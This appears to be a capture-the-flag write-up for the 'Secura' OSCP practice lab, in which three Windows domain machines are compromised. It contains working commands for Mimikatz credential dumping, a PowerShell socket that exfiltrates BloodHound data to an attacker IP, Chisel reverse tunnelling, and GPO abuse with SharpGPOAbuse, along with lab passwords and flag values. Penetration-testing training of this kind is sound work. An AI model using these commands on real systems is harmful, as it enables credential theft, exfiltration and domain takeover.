# Secura Challenge Lab - Complete Writeup

## Executive Summary

The Secura challenge lab consists of three Windows machines in an Active Directory environment. The attack chain demonstrates common enterprise vulnerabilities: web application exploitation, credential reuse, database misconfigurations, and insecure Group Policy permissions.

**Domain:** secura.yzx
**Difficulty:** Intermediate
**Key Skills:** Web exploitation, credential harvesting, port forwarding, AD privilege escalation

### Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SECURA CHALLENGE LAB - COMPLETE                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  .95 (SECURE)          .96 (ERA)              .97 (DC01)                   │
│  ┌──────────┐          ┌──────────┐           ┌──────────┐                 │
│  │AppManager│ exploit  │  MySQL   │ creds     │   GPO    │                 │
│  │  8443    │────────▶│  3306    │─────────▶│  Abuse   │                 │
│  └──────────┘          └──────────┘           └──────────┘                 │
│       │                     │                      │                        │
│       ▼                     ▼                      ▼                        │
│  Mimikatz             Chisel Tunnel          SharpGPOAbuse                 │
│  ─────────            ─────────────          ──────────────                │
│  apache creds         root no-pass           charlotte → Admin            │
│  era.secura.local     creds database         Default Domain Policy        │
│       │                     │                      │                        │
│       ▼                     ▼                      ▼                        │
│  WinRM .96            administrator          Domain Admin                  │
│  (local auth)         charlotte creds        proof.txt ✓                   │
│                            │                                               │
│                            ▼                                               │
│                       proof.txt ✓                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Target Information

| IP | Hostname | Role | Key Services |
|----|----------|------|--------------|
| 192.168.179.95 | SECURE | App Server | ManageEngine AppManager (8443), WinRM (5985), RDP (3389) |
| 192.168.179.96 | ERA | DB Server | MariaDB 10.3.24 (3306), WinRM (5985) |
| 192.168.179.97 | DC01 | Domain Controller | Kerberos (88), LDAP (389), SMB (445), WinRM (5985) |

---

## Machine 1: SECURE (192.168.179.95)

### Enumeration

Initial port scan revealed ManageEngine AppManager running on port 8443 - a known target for exploitation due to historical CVEs.

**Priority Attack Surface:**
1. ManageEngine AppManager (8443) - Known CVEs, web application
2. WinRM (5985) - Remote management
3. RDP (3389) - GUI access if credentials obtained

### Initial Foothold

ManageEngine AppManager was exploited through the Actions Admin interface:

1. Uploaded shell.bat (PowerShell reverse shell) via Actions Admin interface
2. Received shell on listener port 9001
3. Confirmed local SYSTEM/Administrator level access

### Post-Exploitation with Mimikatz

After gaining Administrator access, Mimikatz was used to extract credentials:

```powershell
# Non-interactive Mimikatz execution (useful for evil-winrm sessions)
.\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "vault::cred /patch" "exit"
```

**Why non-interactive?** Evil-WinRM doesn't support interactive prompts. Mimikatz accepts command-line arguments that execute sequentially.

**Credentials Extracted:**

| Username | Credential | Source |
|----------|------------|--------|
| Administrator | NTLM: a51493b0b06e5e35f855245e71af1d14 | LSASS memory |
| apache | New2Era4.! | Credential Manager (era.secura.local) |
| ERIC.WALLOWS | EricLikesRunning800 | LSASS memory |

> **Key Insight:** The Credential Manager entry for "era.secura.local" indicated this was a credential for the ERA machine - crucial for the next pivot.

### BloodHound Data Collection

Uploaded SharpHound for AD enumeration:

```powershell
# Upload and run SharpHound
.\SharpHound.exe -c All

# Exfiltrate via TCP socket
$client = New-Object System.Net.Sockets.TcpClient('192.168.45.229',9002)
$stream = $client.GetStream()
$data = [IO.File]::ReadAllBytes('20251212022831_BloodHound.zip')
$stream.Write($data, 0, $data.Length)
$stream.Close()
$client.Close()
```

### Flags

- **local.txt:** (captured during initial exploitation)
- **proof.txt:** (captured with Administrator access)

---

## Machine 2: ERA (192.168.179.96)

### Initial Access Attempts

#### Failure 1: Direct MariaDB Connection

```bash
mysql -h 192.168.179.96 -u root
# ERROR 1130 (HY000): Host 'KALI_IP' is not allowed to connect to this MariaDB server
```

**Why it failed:** MySQL was configured with host-based ACLs restricting connections to localhost only.

**Lesson:** Always check `bind-address` and user host restrictions in MySQL. Many production databases only allow localhost connections.

#### Failure 2: Domain Authentication

```bash
crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' -d secura.yzx
# [-] secura.yzx\apache:New2Era4.!
```

**Why it failed:** The "apache" account was a LOCAL account on ERA, not a domain account. The Credential Manager entry referenced "era.secura.local" (the machine's hostname), not the domain.

#### Success: Local Authentication

```bash
crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' --local-auth
# [+] 192.168.179.96 (Pwn3d!)
```

> **CRITICAL LESSON:** Always try both `--local-auth` and domain authentication when testing credentials. Credential Manager stores can contain local machine credentials that won't work with domain auth.

### Shell Access

```bash
evil-winrm -i 192.168.179.96 -u apache -p 'New2Era4.!'
```

### Chisel Tunneling for MySQL Access

**Problem:** MySQL only accepts localhost connections. We need to access it from Kali for easier enumeration.

**Solution:** Chisel reverse port forwarding

```
┌─────────────┐                      ┌─────────────┐
│    KALI     │                      │    ERA      │
│             │◄────── Tunnel ───────│             │
│ :3306 ◄─────┼──────────────────────┼─── :3306   │
│             │                      │  (MySQL)    │
└─────────────┘                      └─────────────┘
```

**Step 1:** Start Chisel server on Kali
```bash
chisel server -p 8080 --reverse
```

**Step 2:** Upload chisel.exe to ERA and connect
```powershell
# Upload chisel
iwr http://KALI_IP/chisel.exe -OutFile chisel.exe

# Connect back to Kali, forwarding local MySQL to Kali's port 3306
.\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306
```

**Verification on Kali:**
```bash
# Check connection established
2025/12/13 15:12:25 server: session#1: tun: proxy#R:127.0.0.1:3306=>127.0.0.1:3306: Listening
```

**Step 3:** Connect to MySQL from Kali
```bash
mysql -h 127.0.0.1 -P 3306 -u root
# No password required - XAMPP default!
```

> **Educational Note:** XAMPP, WAMP, and similar development stacks often ship with MySQL root having no password. Always test default credentials.

### MySQL Credential Extraction

```sql
-- List all databases
SHOW DATABASES;
-- creds    <-- HIGH VALUE TARGET
-- information_schema
-- mysql
-- performance_schema
-- phpmyadmin
-- test

-- Check MySQL users
SELECT user, host FROM mysql.user;
-- root | 127.0.0.1
-- root | ::1
-- pma  | localhost
-- root | localhost

-- Enumerate the creds database
USE creds;
SHOW TABLES;

-- Dump credentials
SELECT * FROM creds;
+---------------+-----------------+
| name          | pass            |
+---------------+-----------------+
| administrator | Almost4There8.? |
| charlotte     | Game2On4.!      |
+---------------+-----------------+
```

**MySQL Enumeration Checklist:**
```sql
-- Search for password columns across all databases
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%cred%';

-- Check MySQL user hashes
SELECT user, host, password FROM mysql.user;

-- Check for FILE privilege (read/write files)
SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1);

-- Check secure_file_priv restrictions
SHOW VARIABLES LIKE 'secure_file_priv';
```

### Privilege Escalation to Administrator

The `administrator` password from MySQL was tested and worked:

```bash
evil-winrm -i 192.168.179.96 -u administrator -p 'Almost4There8.?'
```

> **Key Insight:** Database credentials often match system account passwords due to administrator convenience and password reuse.

### Flags

- **local.txt:** `ef117abaa23acf3a58fdea7c6891f11a` (C:\Users\apache\Desktop\local.txt)
- **proof.txt:** `15ee635f37d616dcaf16f72438337a4f` (C:\Users\Administrator\Desktop\proof.txt)

---

## Machine 3: DC01 (192.168.179.97)

### Initial Access

Using the `charlotte` credentials from the MySQL dump:

```bash
evil-winrm -i 192.168.179.97 -u charlotte -p 'Game2On4.!'
```

Charlotte is a low-privilege domain user with WinRM access.

### GPO Enumeration

The attack hint mentioned "insecure GPO permissions." GPO (Group Policy Objects) can be abused if a user has write access.

**Check SYSVOL permissions:**
```powershell
icacls "\\secura.yzx\SYSVOL\secura.yzx\Policies\*"
```

**Output:**
```
\\secura.yzx\SYSVOL\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
    SECURA\Domain Admins:(OI)(CI)(RX,W,WDAC,WO)
    SECURA\Enterprise Admins:(OI)(CI)(RX,W,WDAC,WO)
    SECURA\Domain Admins:(OI)(CI)(IO)(F)
    SECURA\Enterprise Admins:(OI)(CI)(IO)(F)
    NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(RX)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    CREATOR OWNER:(OI)(CI)(IO)(F)
    SECURA\charlotte:(OI)(CI)(F)   <-- FULL CONTROL!

\\secura.yzx\SYSVOL\secura.yzx\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}
    ...
    NT AUTHORITY\Authenticated Users:(OI)(CI)(RX)
    ... (no write access for charlotte)
```

> **CRITICAL FINDING:** Charlotte has Full Control (F) on the Default Domain Policy GPO (`{31B2F340-016D-11D2-945F-00C04FB984F9}`). This GPO applies to ALL domain computers.

**Understanding GPO GUIDs:**
- `{31B2F340-016D-11D2-945F-00C04FB984F9}` = Default Domain Policy
- `{6AC1786C-016F-11D2-945F-00C04FB984F9}` = Default Domain Controllers Policy

### GPO Abuse with SharpGPOAbuse

**Upload SharpGPOAbuse:**
```powershell
iwr http://KALI_IP/SharpGPOAbuse.exe -OutFile sharp.exe
```

**Add charlotte to local Administrators:**
```powershell
.\sharp.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
```

**Force GPO update:**
```powershell
gpupdate /force
```

**Verify:**
```powershell
net localgroup administrators
# Administrator
# charlotte    <-- SUCCESS!
```

### Token Refresh Issue

**Problem:** After adding charlotte to Administrators, running `whoami /groups` still didn't show the Administrators group.

```powershell
whoami /groups
# GROUP INFORMATION
# BUILTIN\Remote Management Users
# BUILTIN\Users
# ... (no Administrators group shown)
```

**Why?** Windows access tokens are created at logon. Group membership changes don't affect existing sessions. The current session's token was created before the GPO applied the group change.

**Solution:** Disconnect and reconnect to get a new token with updated group memberships.

```bash
# Exit current session
exit

# Reconnect - new session will have admin rights
evil-winrm -i 192.168.179.97 -u charlotte -p 'Game2On4.!'
```

**Verify new privileges:**
```powershell
whoami /priv
# PRIVILEGES INFORMATION
# SeIncreaseQuotaPrivilege          Enabled
# SeMachineAccountPrivilege         Enabled
# SeSecurityPrivilege               Enabled
# SeTakeOwnershipPrivilege          Enabled
# SeLoadDriverPrivilege             Enabled
# SeBackupPrivilege                 Enabled
# SeRestorePrivilege                Enabled
# SeDebugPrivilege                  Enabled
# ... (full admin privileges!)
```

### Flags

- **local.txt:** `931153bd267dd40e90d930e4e9486430` (C:\Users\charlotte\Desktop\local.txt)
- **proof.txt:** `eba9a0263085d2fd447f7e91e12609af` (C:\Users\Administrator.DC01\Desktop\proof.txt)

---

## Complete Credentials Table

| Username | Password | Source | Access Gained |
|----------|----------|--------|---------------|
| Administrator | NTLM: a51493b0b06e5e35f855245e71af1d14 | Mimikatz on .95 | .95 local admin |
| apache | New2Era4.! | Credential Manager on .95 | .96 local admin (WinRM) |
| ERIC.WALLOWS | EricLikesRunning800 | Found on .95 | Domain user (unused) |
| administrator | Almost4There8.? | MySQL creds.creds table | .96 local admin (WinRM) |
| charlotte | Game2On4.! | MySQL creds.creds table | .97 DC01 admin (GPO abuse) |

---

## Flags Summary

| Host | Type | Flag |
|------|------|------|
| .95 SECURE | local.txt | (captured) |
| .95 SECURE | proof.txt | (captured) |
| .96 ERA | local.txt | ef117abaa23acf3a58fdea7c6891f11a |
| .96 ERA | proof.txt | 15ee635f37d616dcaf16f72438337a4f |
| .97 DC01 | local.txt | 931153bd267dd40e90d930e4e9486430 |
| .97 DC01 | proof.txt | eba9a0263085d2fd447f7e91e12609af |

---

## Key Techniques Reference

### 1. Local vs Domain Authentication

**When to use `--local-auth`:**
- Credentials found in Credential Manager referencing hostnames (not domain)
- Local Administrator accounts
- Service accounts created locally
- When domain auth fails but you suspect the account exists

**Command comparison:**
```bash
# Domain authentication (default)
crackmapexec winrm TARGET -u USER -p PASS -d DOMAIN

# Local authentication
crackmapexec winrm TARGET -u USER -p PASS --local-auth
```

### 2. Chisel Port Forwarding

**Reverse tunnel (target connects to attacker):**
```bash
# Attacker (Kali)
chisel server -p 8080 --reverse

# Target (Windows)
.\chisel.exe client ATTACKER_IP:8080 R:LOCAL_PORT:TARGET:TARGET_PORT

# Example: Forward MySQL
.\chisel.exe client 192.168.45.229:8080 R:3306:127.0.0.1:3306
```

**Common use cases:**
- MySQL/MSSQL bound to localhost
- Internal web services
- RDP through firewalls
- Any service with host-based ACLs

### 3. MySQL/MariaDB Enumeration

**Quick enumeration:**
```sql
-- Version and system info
SELECT VERSION(); SELECT @@hostname;

-- All databases
SHOW DATABASES;

-- Search for credentials
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%';

-- Check privileges
SHOW GRANTS;
SELECT File_priv FROM mysql.user WHERE user='root';

-- Check file operation restrictions
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Default credentials to try:**
| User | Password |
|------|----------|
| root | (blank) |
| root | root |
| root | mysql |
| admin | admin |

### 4. GPO Abuse

**Enumeration:**
```powershell
# Check SYSVOL ACLs (most reliable)
icacls "\\DOMAIN\SYSVOL\DOMAIN\Policies\*"

# List GPOs (if RSAT available)
Get-GPO -All | Select-Object DisplayName, Id

# Check specific GPO permissions
Get-GPPermission -Guid "GUID-HERE" -All
```

**Exploitation with SharpGPOAbuse:**
```powershell
# Add user to local Administrators
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USER --GPOName "GPO Name"

# Add immediate scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators USER /add" --GPOName "GPO Name" --Force
```

**Post-exploitation:**
```powershell
gpupdate /force  # Apply GPO changes immediately
# IMPORTANT: Reconnect to get new token!
```

---

## Troubleshooting Notes

### Special Characters in Passwords

The `!` character causes escaping issues in bash due to history expansion:

```bash
# FAILS - bash history expansion interprets !
crackmapexec winrm TARGET -u user -p 'Game2On4.!'
# Output shows: Game2On4.\!

# WORKS - double quotes (but still may have issues)
crackmapexec winrm TARGET -u user -p "Game2On4.!"

# BEST - use interactive session directly
evil-winrm -i TARGET -u user -p 'Game2On4.!'

# ALTERNATIVE - disable history expansion
set +H
crackmapexec winrm TARGET -u user -p 'Game2On4.!'
```

### Domain-Wide Flag Search

With Domain Admin access, search all machines:

```powershell
# PowerShell remoting from DC
@("192.168.179.95","192.168.179.96","192.168.179.97") | ForEach-Object {
    $ip = $_
    Write-Host "`n=== $ip ===" -ForegroundColor Green
    Invoke-Command -ComputerName $ip -ScriptBlock {
        cmd /c "dir /s /b C:\*proof*.txt C:\*local*.txt 2>nul"
    } -ErrorAction SilentlyContinue
}

# Via admin shares (from DC)
type \\192.168.179.95\C$\Users\Administrator\Desktop\proof.txt
type \\192.168.179.96\C$\Users\Administrator\Desktop\proof.txt

# CrackMapExec (from Kali) - watch password escaping!
crackmapexec winrm 192.168.179.95,96,97 -u charlotte -p "Game2On4.!" -d secura.yzx -x 'dir /s /b C:\*proof*.txt'
```

### Non-Interactive Mimikatz

For evil-winrm or other non-interactive shells:

```powershell
# Run commands sequentially, exit when done
.\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "vault::cred /patch" "exit"

# Common combinations:
# Dump logon passwords
.\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump SAM
.\mimi.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump credential manager
.\mimi.exe "privilege::debug" "vault::cred /patch" "exit"
```

---

## OSCP Exam Relevance

### Time Management
- 3-machine chain with dependencies
- Don't get stuck on .95 enumeration if you have creds for .96
- Document all credentials immediately - you'll need them later
- BloodHound helps visualize attack paths quickly

### Technique Coverage
This lab covers:
- Web application exploitation (ManageEngine)
- Credential extraction (Mimikatz, Credential Manager)
- Credential reuse between systems
- Port forwarding/tunneling (Chisel)
- Database enumeration (MySQL)
- Active Directory privilege escalation (GPO abuse)

### Documentation Importance
- Track ALL credentials found (even unused ones like ERIC.WALLOWS)
- Document failed attempts - they inform methodology
- Note hostname vs domain context for credentials
- Record exact commands that worked for report writing

---

## Lessons Learned

1. **Local vs Domain Auth:** Always try both `--local-auth` and domain authentication when testing credentials. Credential Manager entries may reference local machines, not the domain.

2. **MySQL Default Credentials:** XAMPP/WAMP installations commonly have MySQL root with no password. Always test default credentials on development stacks.

3. **Tunnel for Localhost Services:** When services bind to 127.0.0.1 only (common security practice), use Chisel or SSH tunneling to access them from your attack box.

4. **Credential Reuse is Pervasive:** Database passwords often match Windows account passwords. Always test credentials across systems - administrators reuse passwords.

5. **GPO Permissions are Gold:** Check SYSVOL ACLs with `icacls`. Write access to a GPO = immediate path to Domain Admin. This is an often-overlooked misconfiguration.

6. **Token Refresh After Group Changes:** After modifying group membership (via GPO or direct manipulation), you MUST start a NEW session to receive the updated access token. Current sessions retain their original permissions until you log out.

7. **Non-Interactive Tool Usage:** Understand how to run tools like Mimikatz non-interactively for constrained shells. Pass commands as arguments with "exit" at the end.

8. **Special Character Handling:** Be aware of shell escaping issues with characters like `!` in passwords. Use appropriate quoting or interactive sessions when automated tools fail.

---

*Writeup completed for OSCP preparation and educational purposes.*
